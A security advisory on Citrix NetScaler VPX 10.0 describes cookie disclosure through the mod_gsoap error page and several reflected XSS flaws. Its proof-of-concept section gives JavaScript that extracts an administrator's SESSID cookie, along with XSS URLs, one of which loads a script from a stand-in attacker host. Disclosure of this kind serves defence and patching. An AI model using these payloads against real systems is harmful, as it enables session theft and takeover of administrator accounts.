Business recommendation:
- ------------------------
Attackers can exploit XSS and other vulnerabilities that lead to cookie disclosure
to execute administrative actions.

Affected Systems should be updated as soon as possible.


Vulnerability overview/description:
- -----------------------------------
1) Cookie disclosure
The error handler in the Apache g_soap module prints all of the request header
information including the HTTP Cookie field. This vulnerability can be used in
XSS attacks to gain access to the otherwise well protected (HttpOnly) "SESSID"
cookie of an administrator.

2) Reflected Cross-Site Scripting (XSS)
Citrix Netscaler suffers from multiple reflected Cross-Site Scripting
vulnerabilities, which allow an attacker to steal user information,
impersonate users and perform administrative actions on the appliance.

There are many parameters which are not properly sanitized and thus
vulnerable to XSS.


Proof of concept:
- -----------------
1) Cookie disclosure
A GET request to the SOAP handler returns the following information:

GET /soap HTTP/1.1
Host: <host>
*OTHER HEADER FIELDS*

Response:
HTTP/1.1 200 OK
...
Content-Type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
...
<BODY>
<H1>mod_gsoap Apache SOAP Server Error</H1>
<p><strong>No body received</strong>
...
<br>Cookie: SESSID=*SESSION ID*;
...

In combination with an XSS vulnerability (see 2) an attacker can use the following
code to extract cookies including the SESSID cookie of an administrator:

var request = new XMLHttpRequest();
request.open(&#039;GET&#039;, &#039;/soap&#039;, false);
request.send();
lines=request.responseText.split(&#039;<br>&#039;)
for (var i in lines){
if (lines[i].indexOf(&#039;Cookie&#039;)==0){
alert(lines[i]);
break;
}
}

2) Reflected Cross-Site Scripting
Accessing the following URL will include the Javascript code from http://evilattacker/evil.js:
http://<host>/menu/topn?name=";<%2fscript><script+src%3d"http:%2f%2fevilattacker%2fevil.js"
;><%2fscript>

Other pages do not sanitize user input properly as well:
http://<host>/pcidss/launch_report?type=AA";alert(&#039;xss&#039;);x="

http://<host>/menu/guiw?nsbrand=AA<"&#039;>AA&protocol=BB<"&#039;>BB&id=CC<"&#039;>CC
Note: Content-Type is application/x-java-jnlp-file, so the injected script code
JNLP file, which might be used in further attacks.


Vulnerable / tested versions:
- -----------------------------
The vulnerabilities have been verified to exist in Citrix NetScaler VPX 10.0,
which was the most recent version at the time of discovery.
According to the vendor versions before 10.1-126.12 and 9.3-62.4 are vulnerable
